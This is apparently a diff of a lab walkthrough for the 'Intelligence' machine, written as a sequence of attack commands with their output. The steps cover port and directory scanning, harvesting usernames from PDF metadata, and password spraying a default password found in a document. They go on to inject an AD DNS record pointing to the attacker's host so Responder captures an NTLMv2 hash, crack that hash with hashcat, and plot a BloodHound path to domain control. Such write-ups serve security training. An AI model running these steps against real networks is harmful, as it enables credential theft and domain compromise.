@@ -1,4 +1,7 @@
-└─$ nmap -p- -sSCV 10.10.10.248 --min-rate 999      
+
+#### port scan
+`└─$ nmap -p- -sSCV 10.10.10.248 --min-rate 999`
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 07:07 EST
 Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
 SYN Stealth Scan Timing: About 14.79% done; ETC: 07:09 (0:01:49 remaining)
@@ -49,10 +52,12 @@ PORT      STATE SERVICE       VERSION
 49710/tcp open  msrpc         Microsoft Windows RPC
 49725/tcp open  msrpc         Microsoft Windows RPC
 49744/tcp open  msrpc         Microsoft Windows RPC
+```
 
-
-
-└─$ gobuster dir -u http://intelligence.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 111 
+#### info enum
+For port 80
+`└─$ gobuster dir -u http://intelligence.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 111 `
+```
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -69,9 +74,10 @@ Starting gobuster in directory enumeration mode
 ===============================================================
 /documents            (Status: 301) [Size: 157] [--> http://intelligence.htb/documents/]
 /Documents            (Status: 301) [Size: 157] [--> http://intelligence.htb/Documents/]
+```
 
+From index page, 2 pdf files with formatted naming style, to identify pdf in this dir, write a simple py script, to request all pdf naming pdf of the whole year and write to local
 
-to identify pdf in this dir, write a simple py script
 ```
 import requests
 
@@ -110,13 +116,11 @@ for i in range(12):
         if content:
             with open(middle + ext , 'wb') as f:
                 f.write(content)
+```  
+                                                                                               
+┌──(ed㉿kali)-[/tmp]
+`└─$ python3 req.py`
 ```
-                                                                        
-┌──(ed㉿kali)-[/tmp]
-└─$ nano req.py    
-                                                                                                 
-┌──(ed㉿kali)-[/tmp]
-└─$ python3 req.py
 Find:  01-01-upload.pdf
 Find:  01-02-upload.pdf
 Find:  01-04-upload.pdf
@@ -127,10 +131,10 @@ Find:  06-21-upload.pdf
 Find:  12-24-upload.pdf
 Find:  12-28-upload.pdf
 Find:  12-30-upload.pdf
-
+```
 
 in 06-04 find a credential:
-
+```
 New Account Guide
 Welcome to Intelligence Corp!
 Please login using your username and the default password of:
@@ -148,12 +152,15 @@ to better view all content, use pdftotext to print all words to terminal
 └─$ for i in /tmp/*.pdf; do 
 for> pdftotext "$i" -     
 for> done
-
-after check the exif of each pdf, all have creator info
-
+```
+after check the exif of each pdf, all have creator info, use script to extract all names
+```
 └─$ for i in /tmp/*.pdf; do
 exiftool "$i"  | grep Creator | cut -d ':' -f2 | xargs
 done
+```
+
+```
 William.Lee
 Scott.Scott
 Jason.Wright
@@ -161,7 +168,7 @@ Veronica.Patel
 Jennifer.Thomas
 Danny.Matthews
 David.Reed
-snip..
+...snip...
 Kaitlyn.Zimmerman
 Jose.Williams
 Stephanie.Young
@@ -177,17 +184,18 @@ Thomas.Hall
 Ian.Duncan
 Jason.Patterson
 William.Lee
-             
+```             
 write to a file
 
-└─$ for i in /tmp/*.pdf; do
+`└─$ for i in /tmp/*.pdf; do
 exiftool "$i"  | grep Creator | cut -d ':' -f2 | xargs | sort -u >> user
-done
+done`
 
-wc -l user
+`wc -l user`
 
 for port 389  ldap
 `└─$ ldapsearch -H ldap://10.10.10.248 -x -s base namingcontexts`
+```
 # extended LDIF
 #
 # LDAPv3
@@ -210,10 +218,10 @@ result: 0 Success
 
 # numResponses: 2
 # numEntries: 1
+```
 
-
-─$ ~/oscp/kerbrute userenum --dc 10.10.10.248 -d intelligence.htb user
-
+`─$ ~/oscp/kerbrute userenum --dc 10.10.10.248 -d intelligence.htb user`
+```
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
@@ -232,9 +240,10 @@ Version: v1.0.3 (9dad6e1) - 01/14/26 - Ronnie Flathers @ropnop
 snip
 2026/01/14 08:33:22 >  [+] VALID USERNAME:	 Thomas.Hall@intelligence.htb
 2026/01/14 08:33:22 >  Done! Tested 86 usernames (86 valid) in 1.006 seconds
+```
 
-
-└─$ crackmapexec smb 10.10.10.248 -u user -p 'NewIntelligenceCorpUser9876' --continue-on-success   
+`└─$ crackmapexec smb 10.10.10.248 -u user -p 'NewIntelligenceCorpUser9876' --continue-on-success  `
+```
 SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
 SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
 SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
@@ -252,12 +261,12 @@ SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephan
 SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
 SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
 
-only got 2 correct pairs
+only got 1 correct pairs
 intelligence.htb\Tiffany.Molina
-intelligence.htb\Tiffany.Molina
-
-
-└─$ netexec smb 10.10.10.248 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares
+```
+check smbprivi
+`└─$ netexec smb 10.10.10.248 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares`
+```
 SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
 SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
 SMB         10.10.10.248    445    DC               [*] Enumerated shares
@@ -270,10 +279,10 @@ SMB         10.10.10.248    445    DC               IT              READ
 SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share
 SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share
 SMB         10.10.10.248    445    DC               Users           READ
-
-
-
-└─$ smbclient  //10.10.10.248/Users -U Tiffany.Molina%NewIntelligenceCorpUser9876   
+```
+get user flag
+`└─$ smbclient  //10.10.10.248/Users -U Tiffany.Molina%NewIntelligenceCorpUser9876   `
+```
 Try "help" to get a list of possible commands.
 smb: \> dir
   .                                  DR        0  Sun Apr 18 21:20:26 2021
@@ -291,8 +300,10 @@ seems it is Users folder files
 
 smb: \Tiffany.Molina\Desktop\> mget user.txt
 Get file user.txt? y
-
-└─$ smbclient  //10.10.10.248/IT -U Tiffany.Molina%NewIntelligenceCorpUser9876   
+```
+#### foothold
+`└─$ smbclient  //10.10.10.248/IT -U Tiffany.Molina%NewIntelligenceCorpUser9876   `
+```
 Try "help" to get a list of possible commands.
 smb: \> dir
   .                                   D        0  Sun Apr 18 20:50:55 2021
@@ -313,38 +324,41 @@ Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Grave
 }
 } catch {}
 }
-        
+```
+use dns tool add a entry, and check what we will get        
 dnstool.py
 Add/modify/delete Active Directory Integrated DNS records via LDAP.
 https://github.com/dirkjanm/krbrelayx/tree/master
 
-└─$ python3 dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -a add --record web-ed --data 10.10.16.8  --type A  10.10.10.248   
+`└─$ python3 dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -a add --record web-ed --data 10.10.16.8  --type A  10.10.10.248  `
+```
 [-] Connecting to host...
 [-] Binding to host
 [+] Bind OK
 [-] Adding new record
 [+] LDAP operation completed successfully
-
-└─$ sudo responder -I tun0 
-
+```
+listening the response, get a credential hash
+`└─$ sudo responder -I tun0 `
+```
 [+] Listening for events...
 
 [HTTP] NTLMv2 Client   : 10.10.10.248
 [HTTP] NTLMv2 Username : intelligence\Ted.Graves
 [HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:08715513f03ceb42:4B4577AC5A1CB64B5578366EFC5AA1A5:010100000000000014883424AE85DC01EC85771F03F5251A0000000002000800320045003500490001001E00570049004E002D00440038004A0045004F004800350059005600570044000400140032004500350049002E004C004F00430041004C0003003400570049004E002D00440038004A0045004F004800350059005600570044002E0032004500350049002E004C004F00430041004C000500140032004500350049002E004C004F00430041004C00080030003000000000000000000000000020000081FA6FB4B6BB12D6981D5C466412C844FE4D5782A62E3EFB6635385EBDA951A90A001000000000000000000000000000000000000900380048005400540050002F007700650062002D00650064002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
-
+```
 
 put this is file hash
-
-└─$ hashcat -m 5600 hash -a 0 ~/oscp/rockyou.txt
-
-
+`└─$ hashcat -m 5600 hash -a 0 ~/oscp/rockyou.txt`
+```
 TED.GRAVES::intelligence:08715513f03ceb42:4b4577ac5a1cb64b5578366efc5aa1a5:010100000000000014883424ae85dc01ec85771f03f5251a0000000002000800320045003500490001001e00570049004e002d00440038004a0045004f004800350059005600570044000400140032004500350049002e004c004f00430041004c0003003400570049004e002d00440038004a0045004f004800350059005600570044002e0032004500350049002e004c004f00430041004c000500140032004500350049002e004c004f00430041004c00080030003000000000000000000000000020000081fa6fb4b6bb12d6981d5c466412c844fe4d5782a62e3efb6635385ebda951a90a001000000000000000000000000000000000000900380048005400540050002f007700650062002d00650064002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
 
 TED.GRAVES   Mr.Teddy
-
-└─$ bloodhound-python -u TED.GRAVES  -p 'Mr.Teddy' -d intelligence.htb -ns 10.10.10.248 -c All --zip
+```
+use bloodhound to view potantial way get domain
+`└─$ bloodhound-python -u TED.GRAVES  -p 'Mr.Teddy' -d intelligence.htb -ns 10.10.10.248 -c All --zip`
 
 upload th zip to bloodhound, get a path, 
 
-ted -> IT sup group --ReadGMSAPassword--> SVC_INT$ --allowtoDelegate--> DC --CoerceToTGT -> domain
+`ted -> IT sup group --ReadGMSAPassword--> SVC_INT$ --allowtoDelegate--> DC --CoerceToTGT -> domain`
+
